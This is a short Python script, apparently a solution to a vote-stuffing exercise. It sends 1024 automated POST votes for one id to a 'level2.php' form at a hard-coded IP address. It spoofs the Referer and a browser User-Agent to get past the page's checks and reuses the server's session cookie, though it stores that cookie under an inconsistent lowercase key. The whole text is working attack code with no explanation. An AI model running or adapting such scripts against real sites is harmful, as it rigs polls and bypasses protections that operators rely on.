import requests
page = "http://158.69.76.135/level2.php"
my_id = {
    'id': '1229',
    'holdthedoor': 'submit',
    'key': '0'
}
cookies = {
    "HoldTheDoor": '0'
}
header = {
    'Referer': 'http://158.69.76.135/level2.php',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36'
}
response = requests.get(page)
for i in range(1024):
    cookies['holdthedoor'] = response.cookies['HoldTheDoor']
    requests.post(page, headers=header, data=my_id, cookies=cookies)
